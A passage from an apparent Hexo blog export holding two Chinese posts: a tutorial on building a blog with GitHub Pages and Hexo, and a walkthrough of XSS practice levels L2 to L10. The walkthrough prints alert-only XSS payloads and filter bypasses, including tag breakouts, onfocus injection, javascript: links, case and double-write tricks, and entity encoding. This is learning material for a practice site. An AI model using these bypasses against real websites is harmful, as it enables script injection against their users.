    <content type="text"><![CDATA[本文记录了利用Github pages + hexo + nexT建站的经过，偶有踩坑。。且没有解决。。以后还是要再多试试。不过从0到1建站还是很有成就感的，记录一哈~ 第一步：本地前提准备 首先推荐官方文档，懒人可参考一下步骤 下载nodejs，Windows用户官网下载，LTS版本，然后安装，默认会配置路径，别忘了重启一下终端，再不行就重启电脑=。= 选择一个自己心仪的博客框架，推荐HEXO，或者是JeKyll， 这两者都是用于生成伪静态页面的两个博客框架，这个博客是使用HEXO搭建的，接下来也是介绍HEXO的建站过程，如果想找JsKyll的框架，可以阅读大佬的博客https://faner.gitlab.io/blog/2017/07/07/jekyll%E5%AE%89%E8%A3%85%E4%B8%8E%E9%83%A8%E7%BD%B2/ 安装HEXO的命令：npm install -g hexo-cli 这一步可能会有warn，但是没事，只要没有error就不影响正常使用，如果发现npm无法请求到东西，可以尝试使用cnpm替换为国内源 接着输入：npm install hexo --save 安装完成后检查一下：hexo -v，如果输出正常，hexo就没问题了 这时在本地新建一个空白文件夹，加入命名为blog，作为你的博客的一个容器，博客相关的东西都会在这里，接着进入这个目录，输入：hexo init 完成hexo的初始化 接着输入hexo clean &amp;&amp; hexo d &amp;&amp; hexo s 把项目启动 点开 http://localhost:4000/ ，恭喜你！已经在本地搭建好博客了 (๑•̀ㅂ•́)و✧！距离成功只差下一步——部署博客到 GitHub Pages 了～ 哦对了，还有一个东西，那就是Git，也要本地安装，有两种方式，一种是下载github客户端Github desktop，或者就是git的安装：可以从Git官网直接下载安装程序 第二步：Github配置这里引一下大佬的博客：https://segmentfault.com/a/1190000017986794 首先如果你还没有 Github 账号的先注册一个，具体过程如下 点击 Start project 或者下面的 new repository 创建一个新的仓库 注意点来了，Github 仅能使用一个同名仓库的代码托管一个静态站点，这个网上很多教程没说到的。 然后github的配置就基本完成了，这时其实已经可以开始干大事了，但是为了方便还是建议阅读一下的配置ssh key的步骤 配置 SSH key要使用 git 工具首先要配置一下SSH key，为部署本地博客到 Github 做准备。 打开命令行输入 cd ~/.ssh 如果没报错或者提示什么的说明就是以前生成过的，直接使用 cat ~/.ssh/id_rsa.pub 命令就是可以查看本机上的 SSH key 了。 1cat ~/.ssh/id_rsa.pub 如果之前没有创建，则执行以下命令全局配置一下本地账户： 12git config --global user.name &quot;用户名&quot;git config --global user.email &quot;邮箱地址&quot; 然后开始生成密钥 SSH key 1ssh-keygen -t rsa -C &apos;上面的邮箱&apos; 按照提示完成三次回车，即可生成 ssh key。通过查看 ~/.ssh/id_rsa.pub 文件内容，获取到你的 SSH key （此图引用自码云） 首次使用还需要确认并添加主机到本机SSH可信列表。若返回 Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 内容，则证明添加成功。 1ssh -T git@github.com 到这还没完，还要登录 Github 上添加刚刚生成的SSH key，按以下步骤添加： 创建一个新的 SSH key, 标题随便，key 就填刚才生成那个，确认创建，搞定！！这样在你的 SSH keys 列表里就会看到你刚刚添加的密钥。 解释一下，这里添加ssh key主要是为了让每次更新博客时不用都输账号密码，如果不添加key的话，github会拒绝我们的SSH链接请求 第三步：第一篇博客博客搭好了，就开始写文章了，这里简单介绍一下，详细的文档可以看 hexo 官网。新建文章，输入以下命令即可 1hexo new &apos;文章标题&apos; 执行完成后可以在 /source/_posts 下看到一个“文章标题.md”的文章文件啦。.md 就是 Markdown 格式的文件，具体用法可以在网上找一下，语法还是比较简单的。 在 Markdown 文章里面输入你的文章内容 如图中见到的，直接使用MK语法就可以编写了。写完后直接hexo d就完成了更新，快试试吧~ 第四步：博客美化大神们的美化做的很到位了，这里推荐几篇~我就先溜了 http://eternalzttz.com/hexo-next.html https://io-oi.me/tech/hexo-next-optimization/ 再或者想实现什么功能，google是最好的选择~ 断断续续弄博客弄了好多天了，虽然挺有成就感的而且学到了很多知识，但是也确实有些疲倦了，更想学习一些安全方面的知识。先这样吧，以后再慢慢的优化。]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS进阶(一)]]></title>
    <url>%2F2019%2F10%2F07%2FXSS-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[XSS进阶（一）直接接着上文http://xss.fbisb.com 中的题，以下的题请使用FireFox进行测试，chrome会默认禁止执行url中的script代码，导致无法弹窗 L2先尝试搜索 1&lt;script&gt;alert(/xss/)&lt;/script&gt; 然后审查元素： 有两处出现了回显，但是观察第一行，我们的代码直接原封不动的回显出来，估计八成就是HTML实体编码了，这个没办法，没法绕过。那么下面那条语句会不会是一个突破口呢？ 尝试构造：&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 成功闭合前面的标签，完成突破，弹窗完毕 L3还是先尝试搜索： 1&lt;script&gt;alert(/xss/)&lt;/script&gt; ，然后审查元素 和上图是一样的，于是尝试&#39;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; ，只不过这次是用单引号闭合的 发现&lt;,&gt;,’ 都被转义了，那么这个时候就想，既然闭合不了，那么能不能通过给标签新加一个属性，来达到运行JavaScript的目的呢？ 尝试:&#39;onfocus=&#39;alert(/xss/)&#39; 当点击文本框时实现弹窗（觉得实现效果不好的话可以尝试添加其他的事件属性） L4还是先尝试搜索：&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; ，然后审查元素， 发现尖括号被过滤了，那尝试上面的思路如何呢？构造&#39;onfocus=&#39;alert(/xss/)&#39; 发现应该把单引号换成双引号去闭合，即：&quot;onfocus=&#39;alert(/xss/)&#39;完成弹窗 L5尝试搜索：&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; ，然后审查元素: 发现在尖括号中的script会被替换成scr_ipt，导致&lt;script&gt;标签无法被正常的识别，同时on也会被替换成o_n,这时候有两个方向，一种是尝试大小写script绕过检测，第二种是利用标签属性，避开使用script，同时也不能使用on事件。 这里经过尝试，大小写无法绕过，那只能是第二种思路了：考虑现在我们还可以利用什么呢？也就是href和src的javascript协议了； 构造&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;,然后点击我们自己构造的a标签，实现弹窗，这里可能会有人不解，href不是应该加一个URL嘛，为什么可以执行JavaScript，其实这里确实是一个URL，浏览器将href等于的字符串当作URL处理，然后读到了JavaScript:这个js的伪协议，于是调用js引擎解析后面的代码，实现了js 的执行 L6搜索：&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; ，然后审查元素,仍然是上图那样，script会被替换，那试试刚刚得payload：&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt; ： 发现确实可以闭合，但是href被替换为hr_ef了，那用src呢？打扰了。。src也会被替换，那么on呢？同样被替换，那么我们回归比较上一题得第一种思路可以解决问题嘛？尝试一下： &quot;&gt;&lt;scRIpT&gt;alert(/xss/)&lt;/scRIpt&gt; OK,OVER！ L7先尝试一下上一关得payload&quot;&gt;&lt;scRIpT&gt;alert(/xss/)&lt;/scRIpt&gt; 发现script被替换了，欸，能不能双写绕过？构造&#39;&quot;&gt;&lt;scriscriptpt&gt;alert(/xss/)&lt;/scriscriptpt&gt; 原理是什么呢？当一个script被替换为空时，外层得script又被组合出来了，形成payload，完成弹窗，OK L8题目形式发生了变化，变成了添加友链，观察一下代码： 那我们能不能直接：javascript:alert(/xss/) , 结果不行，发现script被替换，但是仔细看，这里是在标签内，我们其实可以尝试使用HTML Encode绕过，尝试一下： 1&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29; 这个其实就是javascript:alert(/xss/)得HTML实体编码，由于是在HTML标签中，这些标签会被正常得解析成HTML，但是在后端看来并没有script需要被替换，于是将内容原封不动得返回到前端交由浏览器渲染。 ok，payload有效，完成弹窗 L9先尝试一下javascript:alert(/xss/) 提示链接不合法，那我们考虑一下，什么样的链接是合法的呢？通过不断尝试，发现后端会判断有没有”http://“这个字符串出现，如果出现，其他都不检测，就认为是合法链接，将用户输入拼接进a标签中 那这时候，我们灵光一显，我构造javascript:alert(http://) (记得除了http://外，要HTML encode一下绕过替换)，OK，实现弹窗 L10直接啥都没了？没有输入的地方？这我怎么办嘛？别着急，审查一下元素： 发现猫腻，输入框被隐藏了，那我们只需要把hidden属性去掉，文本框就会显现出来，但是注意这里是没有submit按钮，也就是无法提交我们的表单，那这时候怎么办？—-当然是自己加一个标签啊！ 测试一下那个字段会回显：发现t_sort会将我们提交的数据拼接起来，ok，开始构造XSS： &quot;&gt;onfocus=&quot;alert(/xss/)&quot; 聚焦时实现弹窗 OK，今天就先到这里吧，明天接着写后10道题]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
</search>
